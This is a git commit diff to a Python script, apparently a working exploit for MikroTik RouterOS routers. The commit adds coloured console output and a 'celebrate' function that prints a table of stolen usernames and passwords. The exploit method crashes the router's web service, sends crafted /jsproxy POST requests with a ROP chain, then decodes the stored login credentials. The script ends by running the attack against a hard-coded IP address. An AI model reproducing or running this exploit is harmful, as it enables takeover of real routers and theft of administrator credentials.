8f2510c88c4df8696578f72581515d48ba33ad5e
Xavier Kibet <xavierkibet@gmail.com>
2018-05-07 22:22:37 +0300

    Add Celebration table

--- chimayred.py
+++ chimayred.py
@@ -1,5 +1,24 @@
 import requests,socket,hashlib
 from time import sleep
+
+class printer():
+	colors = {
+		'OKGREEN' :'\033[92m',
+		'WARNING' : '\033[93m',
+		'FAIL' : '\033[91m',
+		'ENDC': '\033[0m' }
+	def __init__(self,CLR):
+		self.color = self.colors[CLR]
+		self.term = self.colors['ENDC']
+
+	def __call__(self,text):
+		print(self.color + '[+] '+self.term+text)
+print_s = printer('OKGREEN')
+print_w = printer('WARNING')
+print_e = printer('FAIL')
+
+
+
 class Vuln():
 	long_stack=['6.33', '6.33.1', '6.33.2', '6.33.3', '6.33.5', '6.33.6', '6.34', '6.34.1', '6.34.2', '6.34.3', '6.34.4', '6.34.5', '6.34.6', '6.35', '6.35.1', '6.35.2', '6.35.4', '6.36', '6.36.1', '6.36.2', '6.36.3', '6.36.4', '6.37', '6.37.1', '6.37.2', '6.37.3', '6.37.4', '6.37.5', '6.38', '6.38.1', '6.38.2', '6.38.3', '6.38.4']
 	def __init__(self,ip,port=80):
@@ -33,7 +52,7 @@ class Vuln():
 			ropchain=ropchains[rop_offset:rop_offset+932]
 			return ropchain
 		else:
-			print "I may have skipped that one"
+			print_e("I may have skipped that one")
 	def create_sockets(self,number):
 		sockets=[]
 		for i in range(number):
@@ -50,19 +69,6 @@ class Vuln():
 		self.send_data(s,b'A' * 4096)
 		s.close()
 		sleep(2.5)
-	def exploit(self):
-		if self.vulnerable:
-			self.crash()
-			s1,s2=self.create_sockets(2)
-			stack_size=167936 if self.version in self.long_stack else 8425472
-			self.send_data(s1,"POST /jsproxy HTTP/1.1\r\nContent-Length: %s\r\n\r\n"%stack_size)
-			self.send_data(s1,b'A'*(4076))
-			self.send_data(s2,"POST /jsproxy HTTP/1.1\r\nContent-Length: 32768\r\n\r\n")
-			self.send_data(s1,self.ropChain)
-			s2.close()
-			sleep(2.5)
-		else:
-			print "How can I attack a target that is not vulnerable?"
 	def extract_login(self):
 		self.results=[]
 
@@ -80,10 +86,42 @@ class Vuln():
 			password=""
 			for i in range(len(pwdenc)):
 				password+=chr(ord(pwdenc[i])^ord(pwkey[i%len(pwkey)]))
-
-			print username,password
+			password=password.split(b'\x00')[0]
 			self.results.append([username,password])
+	def celebrate(self):
+		users=map(lambda x: x[0],self.results)
+		passwords=map(lambda x:x[1],self.results)
 
-router=Vuln('20.20.20.237')
+		longest_user_len=len(sorted(users,key=len)[-1])
+		longest_pass_len=len(sorted(passwords,key=len)[-1])
+
+		longest_user_len = longest_user_len if longest_user_len > 4 else 4
+		longest_pass_len = longest_pass_len if longest_pass_len > 4 else 4
+
+		print_s("=-"*((longest_pass_len+longest_user_len+8)/2))
+		print_s("| USER%s | PASS%s |"%((longest_user_len-4)*" ",(longest_pass_len-4)*" "))
+		print_s("=-"*((longest_pass_len+longest_user_len+8)/2))
+
+		for i in self.results:
+			userpad = i[0]+(longest_user_len-len(i[0]))*" "
+			passpad = i[1]+(longest_pass_len-len(i[1]))*" "
+			print_s("| %s | %s |"%(userpad,passpad))
+
+		print_s("=-"*((longest_pass_len+longest_user_len+8)/2))
+	def exploit(self):
+		if self.vulnerable:
+			self.crash()
+			s1,s2=self.create_sockets(2)
+			stack_size=167936 if self.version in self.long_stack else 8425472
+			self.send_data(s1,"POST /jsproxy HTTP/1.1\r\nContent-Length: %s\r\n\r\n"%stack_size)
+			self.send_data(s1,b'A'*(4076))
+			self.send_data(s2,"POST /jsproxy HTTP/1.1\r\nContent-Length: 32768\r\n\r\n")
+			self.send_data(s1,self.ropChain)
+			s2.close()
+			sleep(2.5)
+			self.extract_login()
+			self.celebrate()
+		else:
+			print_e("How can I attack a target that is not vulnerable?")
+router=Vuln('192.168.0.37')
 router.exploit()
-router.extract_login()
